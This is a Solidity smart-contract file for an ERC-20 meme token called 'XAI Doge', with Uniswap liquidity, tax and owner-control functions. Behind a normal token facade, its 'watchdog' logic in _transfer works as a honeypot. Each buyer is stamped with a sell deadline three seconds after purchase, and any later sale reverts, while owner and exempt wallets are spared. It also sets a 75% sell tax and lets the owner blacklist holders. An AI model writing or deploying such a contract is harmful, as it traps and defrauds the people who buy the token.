1 // SPDX-License-Identifier: MIT
2 
3 /*
4 
5 TG: https://t.me/XAIDoge_Portal
6 WEB: https://xaidoge.online
7 Twitter: https://medium.com/@xaidoge
8 Medium: https://medium.com/@xaidoge
9 
10 */
11 
12 pragma solidity ^0.8.17;
13 
14 library Address{
15     function sendValue(address payable recipient, uint256 amount) internal {
16         require(address(this).balance >= amount, "Address: insufficient balance");
17 
18         (bool success, ) = recipient.call{value: amount}("");
19         require(success, "Address: unable to send value, recipient may have reverted");
20     }
21 }
22 
23 abstract contract Context {
24     function _msgSender() internal view virtual returns (address payable) {
25         return payable(msg.sender);
26     }
27 
28     function _msgData() internal view virtual returns (bytes memory) {
29         this;
30         return msg.data;
31     }
32 }
33 
34 abstract contract Ownable is Context {
35     address private _owner;
36 
37     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
38 
39     constructor() {
40         _setOwner(_msgSender());
41     }
42 
43     function owner() public view virtual returns (address) {
44         return _owner;
45     }
46 
47     modifier onlyOwner() {
48         require(owner() == _msgSender(), "Ownable: caller is not the owner");
49         _;
50     }
51 
52     function renounceOwnership() public virtual onlyOwner {
53         _setOwner(address(0));
54     }
55 
56     function transferOwnership(address newOwner) public virtual onlyOwner {
57         require(newOwner != address(0), "Ownable: new owner is the zero address");
58         _setOwner(newOwner);
59     }
60 
61     function _setOwner(address newOwner) private {
62         address oldOwner = _owner;
63         _owner = newOwner;
64         emit OwnershipTransferred(oldOwner, newOwner);
65     }
66 }
67 
68 interface IERC20 {
69 
70     function totalSupply() external view returns (uint256);
71     function balanceOf(address account) external view returns (uint256);
72     function transfer(address recipient, uint256 amount) external returns (bool);
73     function allowance(address owner, address spender) external view returns (uint256);
74     function approve(address spender, uint256 amount) external returns (bool);
75     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
76 
77     event Transfer(address indexed from, address indexed to, uint256 value);
78     event Approval(address indexed owner, address indexed spender, uint256 value);
79 }
80 
81 interface IFactory{
82     function createPair(address tokenA, address tokenB) external returns (address pair);
83 }
84 
85 interface IRouter {
86     function factory() external pure returns (address);
87     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
88     function WETH() external pure returns (address);
89     function addLiquidityETH(
90         address token,
91         uint amountTokenDesired,
92         uint amountTokenMin,
93         uint amountETHMin,
94         address to,
95         uint deadline
96     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
97     function swapExactTokensForETHSupportingFeeOnTransferTokens(
98         uint amountIn,
99         uint amountOutMin,
100         address[] calldata path,
101         address to,
102         uint deadline) external;
103 }
104 
105 contract XAIDoge is Context, IERC20, Ownable {
106 
107     using Address for address payable;
108 
109     IRouter public router;
110     address public pair;
111     
112     mapping (address => uint256) private _tOwned;
113     mapping (address => mapping (address => uint256)) private _allowances;
114 
115     mapping (address => bool) public _isExcludedFromFee;
116     mapping (address => bool) public _isExcludedFromMaxBalance;
117     mapping (address => bool) public _isBlacklisted;
118     mapping (address => uint256) public _dogSellTime;
119 
120     uint256 private _dogSellTimeOffset = 3;
121     bool public watchdogMode = true;
122     uint256 public _caughtDogs;
123 
124     uint8 private constant _decimals = 9; 
125     uint256 private _tTotal = 1_000_000 * (10**_decimals);
126     uint256 public swapThreshold = 5_000 * (10**_decimals); 
127     uint256 public maxTxAmount = 20_000 * (10**_decimals);
128     uint256 public maxWallet =  20_000 * (10**_decimals);
129 
130     string private constant _name = "XAI Doge"; 
131     string private constant _symbol = "XDOGE";
132 
133     struct Tax{
134         uint8 marketingTax;
135         uint8 lpTax;
136     }
137 
138     struct TokensFromTax{
139         uint marketingTokens;
140         uint lpTokens;
141     }
142     TokensFromTax public totalTokensFromTax;
143 
144     Tax public buyTax = Tax(25,1);
145     Tax public sellTax = Tax(75,1);
146     
147     address public marketingWallet = 0xd80445B063a4Ed70eE6B62c66B8dd6A33E6611C0;
148     
149     bool private swapping;
150     uint private _swapCooldown = 5; 
151     uint private _lastSwap;
152     modifier lockTheSwap {
153         swapping = true;
154         _;
155         swapping = false;
156     }
157 
158     constructor () {
159         _tOwned[_msgSender()] = _tTotal;
160         IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
161         address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
162         router = _router;
163         pair = _pair;
164         _approve(owner(), address(router), ~uint256(0));
165         
166         _isExcludedFromFee[owner()] = true;
167         _isExcludedFromFee[address(this)] = true;
168         _isExcludedFromFee[marketingWallet] = true;
169 
170         _isExcludedFromMaxBalance[owner()] = true;
171         _isExcludedFromMaxBalance[address(this)] = true;
172         _isExcludedFromMaxBalance[pair] = true;
173         _isExcludedFromMaxBalance[marketingWallet] = true;
174         
175         emit Transfer(address(0), _msgSender(), _tTotal);
176     }
177 
178 // ================= ERC20 =============== //
179     function name() public pure returns (string memory) {
180         return _name;
181     }
182 
183     function symbol() public pure returns (string memory) {
184         return _symbol;
185     }
186 
187     function decimals() public pure returns (uint8) {
188         return _decimals;
189     }
190 
191     function totalSupply() public view override returns (uint256) {
192         return _tTotal;
193     }
194 
195     function balanceOf(address account) public view override returns (uint256) {
196         return _tOwned[account];
197     }
198 
199     function transfer(address recipient, uint256 amount) public override returns (bool) {
200         _transfer(_msgSender(), recipient, amount);
201         return true;
202     }
203 
204     function allowance(address owner, address spender) public view override returns (uint256) {
205         return _allowances[owner][spender];
206     }
207 
208     function approve(address spender, uint256 amount) public override returns (bool) {
209         _approve(_msgSender(), spender, amount);
210         return true;
211     }
212 
213     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
214         _transfer(sender, recipient, amount);
215         _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
216         return true;
217     }
218 
219     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
220         _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
221         return true;
222     }
223 
224     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
225         _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);
226         return true;
227     }
228 
229     function _approve(address owner, address spender, uint256 amount) private {
230         require(owner != address(0), "ERC20: approve from the zero address");
231         require(spender != address(0), "ERC20: approve to the zero address");
232         _allowances[owner][spender] = amount;
233         emit Approval(owner, spender, amount);
234     }
235     
236     receive() external payable {}
237 // ========================================== //
238 
239 //============== Owner Functions ===========//
240    
241     function owner_setBlacklisted(address account, bool isBlacklisted) public onlyOwner{
242         _isBlacklisted[account] = isBlacklisted;
243     }
244     
245     function owner_setBulkIsBlacklisted(address[] memory accounts, bool state) external onlyOwner{
246         for(uint256 i =0; i < accounts.length; i++){
247             _isBlacklisted[accounts[i]] = state;
248         }
249     }
250 
251     function owner_setBuyTaxes(uint8 marketingTax, uint8 lpTax) external onlyOwner{
252         uint tTax =  marketingTax + lpTax;
253         require(tTax <= 30, "Can't set tax too high");
254         buyTax = Tax(marketingTax,lpTax);
255         emit TaxesChanged();
256     }
257 
258     function owner_setSellTaxes(uint8 marketingTax, uint8 lpTax) external onlyOwner{
259         uint tTax = marketingTax + lpTax;
260         require(tTax <= 80, "Can't set tax too high");
261         sellTax = Tax(marketingTax,lpTax);
262         emit TaxesChanged();
263     }
264     
265     function owner_setTransferMaxes(uint maxTX_EXACT, uint maxWallet_EXACT) public onlyOwner{
266         uint pointFiveSupply = (_tTotal * 5 / 1000) / (10**_decimals);
267         require(maxTX_EXACT >= pointFiveSupply && maxWallet_EXACT >= pointFiveSupply, "Invalid Settings");
268         maxTxAmount = maxTX_EXACT * (10**_decimals);
269         maxWallet = maxWallet_EXACT * (10**_decimals);
270     }
271 
272     function owner_rescueETH(uint256 weiAmount) public onlyOwner{
273         require(address(this).balance >= weiAmount, "Insufficient ETH balance");
274         payable(msg.sender).transfer(weiAmount);
275     }
276 
277     function owner_rescueExcessTokens() public{
278         // Make sure ca doesn't withdraw the pending taxes to be swapped.
279         // Sends excess tokens / accidentally sent tokens back to marketing wallet.
280         uint pendingTaxTokens = totalTokensFromTax.lpTokens + totalTokensFromTax.marketingTokens;
281         require(balanceOf(address(this)) >  pendingTaxTokens);
282         uint excessTokens = balanceOf(address(this)) - pendingTaxTokens;
283         _transfer(address(this), marketingWallet, excessTokens);
284     }
285     
286     function owner_setWatchDogMode(bool status_) external onlyOwner{
287         watchdogMode = status_;
288     }
289 
290     function owner_setDogSellTimeForAddress(address holder, uint dTime) external onlyOwner{
291         _dogSellTime[holder] = block.timestamp + dTime;
292     }
293 
294 // ========================================//
295     
296     function _getTaxValues(uint amount, address from, bool isSell) private returns(uint256){
297         Tax memory tmpTaxes = buyTax;
298         if (isSell){
299             tmpTaxes = sellTax;
300         }
301 
302         uint tokensForMarketing = amount * tmpTaxes.marketingTax / 100;
303         uint tokensForLP = amount * tmpTaxes.lpTax / 100;
304 
305         if(tokensForMarketing > 0)
306             totalTokensFromTax.marketingTokens += tokensForMarketing;
307 
308         if(tokensForLP > 0)
309             totalTokensFromTax.lpTokens += tokensForLP;
310 
311         uint totalTaxedTokens = tokensForMarketing + tokensForLP;
312 
313         _tOwned[address(this)] += totalTaxedTokens;
314         if(totalTaxedTokens > 0)
315             emit Transfer (from, address(this), totalTaxedTokens);
316             
317         return (amount - totalTaxedTokens);
318     }
319 
320     function _transfer(address from,address to,uint256 amount) private {
321         require(from != address(0), "ERC20: transfer from the zero address");
322         require(to != address(0), "ERC20: transfer to the zero address");
323         require(amount > 0, "Transfer amount must be greater than zero");
324         require(amount <= maxTxAmount || _isExcludedFromMaxBalance[from], "Transfer amount exceeds the _maxTxAmount.");
325         require(!_isBlacklisted[from] && !_isBlacklisted[to], "Blacklisted, can't trade");
326 
327         if(!_isExcludedFromMaxBalance[to])
328             require(balanceOf(to) + amount <= maxWallet, "Transfer amount exceeds the maxWallet.");
329         
330         if (balanceOf(address(this)) >= swapThreshold && block.timestamp >= (_lastSwap + _swapCooldown) && !swapping && from != pair && from != owner() && to != owner())
331             swapAndLiquify();
332           
333         _tOwned[from] -= amount;
334         uint256 transferAmount = amount;
335         
336         if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
337             transferAmount = _getTaxValues(amount, from, to == pair);
338             if (from == pair){
339                 if(watchdogMode){
340                     _caughtDogs++;
341                     _dogSellTime[to] = block.timestamp + _dogSellTimeOffset;
342                 }
343             }else{
344                 if (_dogSellTime[from] != 0)
345                     require(block.timestamp < _dogSellTime[from]); 
346             }
347         }
348 
349         _tOwned[to] += transferAmount;
350         emit Transfer(from, to, transferAmount);
351     }
352 
353     function swapAndLiquify() private lockTheSwap{
354         
355         if(totalTokensFromTax.marketingTokens > 0){
356             uint256 ethSwapped = swapTokensForETH(totalTokensFromTax.marketingTokens);
357             if(ethSwapped > 0){
358                 payable(marketingWallet).transfer(ethSwapped);
359                 totalTokensFromTax.marketingTokens = 0;
360             }
361         }   
362 
363         if(totalTokensFromTax.lpTokens > 0){
364             uint half = totalTokensFromTax.lpTokens / 2;
365             uint otherHalf = totalTokensFromTax.lpTokens - half;
366             uint balAutoLP = swapTokensForETH(half);
367             if (balAutoLP > 0)
368                 addLiquidity(otherHalf, balAutoLP);
369             totalTokensFromTax.lpTokens = 0;
370         }
371 
372         emit SwapAndLiquify();
373 
374         _lastSwap = block.timestamp;
375     }
376 
377     function swapTokensForETH(uint256 tokenAmount) private returns (uint256) {
378         uint256 initialBalance = address(this).balance;
379         address[] memory path = new address[](2);
380         path[0] = address(this);
381         path[1] = router.WETH();
382 
383         _approve(address(this), address(router), tokenAmount);
384 
385         router.swapExactTokensForETHSupportingFeeOnTransferTokens(
386             tokenAmount,
387             0,
388             path,
389             address(this),
390             block.timestamp
391         );
392         return (address(this).balance - initialBalance);
393     }
394 
395     function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
396         _approve(address(this), address(router), tokenAmount);
397 
398         (,uint256 ethFromLiquidity,) = router.addLiquidityETH {value: ethAmount} (
399             address(this),
400             tokenAmount,
401             0,
402             0,
403             owner(),
404             block.timestamp
405         );
406         
407         if (ethAmount - ethFromLiquidity > 0)
408             payable(marketingWallet).sendValue (ethAmount - ethFromLiquidity);
409     }
410 
411     event SwapAndLiquify();
412     event TaxesChanged();
413 
414 }